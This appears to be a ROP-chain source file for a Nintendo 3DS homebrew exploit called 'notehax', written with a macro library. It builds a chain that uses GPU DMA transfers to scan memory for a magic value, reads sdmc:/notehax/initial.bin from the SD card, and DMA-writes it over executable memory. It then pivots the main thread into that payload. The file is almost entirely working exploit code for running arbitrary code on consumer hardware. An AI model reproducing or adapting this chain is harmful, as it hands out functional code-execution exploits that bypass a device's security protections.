from constants import *
include("macros.py")

LOOP_DST = LINEAR_BUFFER + 0x100000
FILE_DST = LOOP_DST - 0x4000

set_mem_offset(ROP_DEST)

deref_to_r0(APPMEMTYPE)
compare_r0(0x6)
store_eq(LINEAR_BUFFER + 0x07C00000 - CODEBIN_MAX_SIZE, loop_src)

put_label("scan_loop")

add_word(GSPGPU_GXTRYENQUEUE_WRAPPER)
add_word(0x4)
put_label("loop_src")
add_word(LINEAR_BUFFER + 0x04000000 - CODEBIN_MAX_SIZE)
add_word(LOOP_DST)
add_word(SCANLOOP_STRIDE)
add_word(0xFFFFFFFF)
add_word(0xFFFFFFFF)
add_word(0x8)
add_word(0x0)

add_word(0x0)

garbage(4)

sleep(100*1000)

store(GSPGPU_GXTRYENQUEUE_WRAPPER, scan_loop)
memcmp(LOOP_DST, PAYLOAD_VA, 0x20)
compare_r0(0x1)
store_eq(NOP, loop_pivot)

deref_to_r0(loop_src)
add_r0(SCANLOOP_STRIDE) #next mempage
store_r0_to(loop_src)

flush_dcache(LOOP_DST, SCANLOOP_STRIDE)

pop(r0=scan_loop, r1=NOP)
put_label("loop_pivot")
add_word(MOV_SP_R0_MOV_R0R2_MOV_LRR3_BX_R1)

deref_to_r0(loop_src)
add_r0(0x100000000 - SCANLOOP_STRIDE) #after the scanloop is broken, magicval is at *(loop_src) - SCANLOOP_STRIDE
store_r0_to(final_dst)                   #store the location for the final gspwn

mount_sdmc(sdmc_string)
try_open_file(context, file_path, FSFILE_READ)
try_get_size(context, file_size)
try_read_file(context, 0, 0, bytes_read, file_size, FILE_DST)
close_file(context)

flush_dcache(FILE_DST, 0x100000)

add_word(GSPGPU_GXTRYENQUEUE_WRAPPER)
add_word(0x4)
add_word(FILE_DST)
put_label("final_dst")
add_word(0xDEADC0DE)
add_word(0x2000)
add_word(0xFFFFFFFF)
add_word(0xFFFFFFFF)
add_word(0x8)
add_word(0x0)

add_word(0x0)

garbage(4)

sleep(300*1000*1000)

store_byte(0x1, THREAD1_BREAK)
store(PAYLOAD_VA, MAIN_THREAD_POP_PTR)
store_byte(0x1, MAIN_THREAD_BREAK)

add_word(SVC_EXITTHREAD)

put_label("bytes_read")
add_word(0x0)

put_label("context")
fill(0x20, 0)

put_label("file_size")
add_word(0x0)
add_word(0x0)

put_label("sdmc_string")
add_ascii("sdmc:\0\0\0")

put_label("file_path")
add_utf16("sdmc:/notehax/initial.bin\0")
